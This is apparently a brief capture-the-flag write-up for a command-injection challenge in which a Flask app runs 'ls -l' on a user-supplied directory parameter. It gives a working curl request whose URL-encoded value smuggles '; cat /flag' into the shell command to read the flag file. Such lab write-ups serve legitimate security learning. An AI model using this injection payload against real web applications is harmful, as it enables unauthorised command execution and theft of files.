# CMDi 1

```shell
cat /challenge/server
```

The Flask app takes a directory as query param (`/adventure?dir`) and executes `ls -l {dir}`
Can inject `; cat <flag>`

Start the server and use curl:

```shell
curl http://challenge.localhost:80/adventure?dir=.%3B%20cat%20%2Fflag
```

(URL-encoding of ".; cat /flag")
